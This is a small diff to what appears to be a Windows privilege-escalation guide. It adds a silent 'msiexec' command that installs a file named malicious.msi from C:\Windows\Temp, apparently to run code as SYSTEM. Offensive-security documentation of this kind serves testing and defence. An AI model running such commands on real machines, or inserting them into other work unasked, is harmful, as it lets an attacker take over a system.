@@ -295,6 +295,7 @@ Then install MSI as SYSTEM.
 
 ```
 msiexec /i payload.msi
+msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
 ```
 
 ---
